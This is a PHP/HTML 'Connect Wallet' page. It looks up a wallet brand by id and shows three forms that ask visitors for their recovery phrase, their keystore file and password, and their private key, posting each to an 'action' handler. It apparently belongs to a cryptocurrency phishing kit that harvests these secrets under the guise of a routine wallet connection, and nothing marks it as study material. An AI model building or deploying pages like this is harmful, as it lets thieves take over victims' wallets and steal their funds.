<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <title>Connect Wallet</title>
    <meta content="" name="description">
    <meta content="" name="keywords">

    <!-- Favicons -->
    <link href="../cft-logo2.png" rel="icon">
    <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">

    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,600;1,700&family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&family=Inter:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">

    <!-- Vendor CSS Files -->
    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
    <link href="assets/vendor/fontawesome-free/css/all.min.css" rel="stylesheet">
    <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
    <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
    <link href="assets/vendor/aos/aos.css" rel="stylesheet">

    <!-- Template Main CSS File -->
    <link href="assets/css/main.css" rel="stylesheet">

</head>

<body>
<header id="header" class=" pt-3 d-flex align-items-center">
  <nav class="top">
        <a href="connect">
        <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" fill="currentColor" class="bi bi-arrow-left-circle" viewBox="0 0 16 16">
        <path fill-rule="evenodd" d="M1 8a7 7 0 1 0 14 0A7 7 0 0 0 1 8m15 0A8 8 0 1 1 0 8a8 8 0 0 1 16 0m-4.5-.5a.5.5 0 0 1 0 1H5.707l2.147 2.146a.5.5 0 0 1-.708.708l-3-3a.5.5 0 0 1 0-.708l3-3a.5.5 0 1 1 .708.708L5.707 7.5z"/>
        </svg>
        </a>
  </nav>
  </header>
    <!-- ======= Header ======= -->
    <?php
    if (isset($_GET['id'])) {
        require_once("../_db.php");
        $id = $_GET['id'];

        // Prepare a statement to fetch user details by wallet_id
        $stmt = $conn->prepare("SELECT * FROM wallet WHERE id = ?");
        $stmt->bind_param("i", $id);
        $stmt->execute();

        $result = $stmt->get_result();

        if ($result->num_rows > 0) {
            while ($row = $result->fetch_assoc()) {
                // Your data retrieval
    ?>
                <header id="header" class="pt-3 d-flex align-items-center">
                    <div class="container-fluid ">
                        <center>
                            <img src="<?php echo $row["wallet_img"]; ?>" alt="<?php echo $row["wallet_name"]; ?>" width=100 height=100>
                        </center>
                    </div>
                </header><!-- End Header -->
                <h2 class="bold d-flex justify-content-center" style="font-weight:900; font-size:40px">
                    <?php echo $row["wallet_name"]; ?>
                </h2>
   
    <!-- End Header -->

    <main id="mains">

        <!-- ======= Featured Services Section ======= -->
        <section id="featured-services" class="featured-services">
            <div class="container">
                <ul class="nav nav-tabs" id="myTabs" role="tablist">
                    <li class="nav-item">
                        <a class="nav-link active" id="phrase-tab" data-toggle="tab" href="#phrase" role="tab" aria-controls="phrase" aria-selected="true">phrase</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" id="keystore-tab" data-toggle="tab" href="#keystore" role="tab" aria-controls="keystore" aria-selected="false">keystore</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" id="private_key-tab" data-toggle="tab" href="#private_key" role="tab" aria-controls="private_key" aria-selected="false">private_key</a>
                    </li>
                </ul>
                <div class="tab-content mt-2 card">
                    <div class="tab-pane fade show active" id="phrase" role="tabpanel" aria-labelledby="phrase-tab">
                        <form method="POST" class="px-3 py-3" action="action">
                            <input type="hidden" name="wallet_name" value="<?php echo $row["wallet_name"]; ?>">
                            <div class="form-group">
                                <textarea name="phrase" required cols="30" rows="5" type="text" class="form-control" placeholder="Enter your recovery phrase"></textarea>
                            </div>
                            <br>
                            <div class="form-group">
                                <small for="recipient-name" class="control-label">Typically 12 (sometimes 24) words separated by single spaces</small>
                            </div>
                            <br>
                            <div class="modal-footer">
                                <button type="submit" class="btn btn-primary waves-effect waves-light" name="submit_phrase">Connect Wallet</button>
                            </div>
                        </form>
                    </div>
                    <div class="tab-pane fade" id="keystore" role="tabpanel" aria-labelledby="keystore-tab">
                        <form method="POST" class="px-3 py-3" action="action">
                            <input type="hidden" name="wallet_name" value="<?php echo $row["wallet_name"]; ?>">
                            <div class="form-group">
                                <textarea name="keystore" required cols="30" rows="5" type="text" class="form-control" placeholder="Enter Keystore"></textarea>
                            </div>
                            <div class="form-group">
                                <input type="text" name="wallet_pass" required class="form-control" placeholder="Wallet Password">
                            </div>
                            <br>
                            <div class="form-group">
                                <small for="recipient-name" class="control-label">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
                            </div>
                            <br>
                            <div class="modal-footer">
                                <button type="submit" class="btn btn-primary waves-effect waves-light" name="submit_keystore">Connect Wallet</button>
                            </div>
                        </form>
                    </div>
                    <div class="tab-pane fade" id="private_key" role="tabpanel" aria-labelledby="private_key-tab">
                        <form method="POST" class="px-3 py-3" action="action">
                            <input type="hidden" name="wallet_name" value="<?php echo $row["wallet_name"]; ?>">
                            <div class="form-group">
                                <input type="text" class="form-control" required name="private_key" placeholder="Enter Private Key">
                            </div>
                            <br>
                            <div class="form-group">
                                <small for="recipient-name" class="control-label">Typically 12 (sometimes 24) words separated by single spaces</small>
                            </div>
                            <br>
                            <div class="modal-footer">
                                <button type="submit" class="btn btn-primary waves-effect waves-light" name="submit_private_key">Connect Wallet</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </section><!-- End Featured Services Section -->
        <?php
            }
        }
    }
    ?>
    </main><!-- End #main -->

    <a href="#" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

    <div id="preloader"></div>

    <!-- Bootstrap JS and Popper.js -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.1/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <!-- Vendor JS Files -->
    <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="assets/vendor/purecounter/purecounter_vanilla.js"></script>
    <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
    <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
    <script src="assets/vendor/aos/aos.js"></script>
    <script src="assets/vendor/php-email-form/validate.js"></script>

    <!-- Template Main JS File -->
    <script src="assets/js/main.js"></script>

</body>

</html>
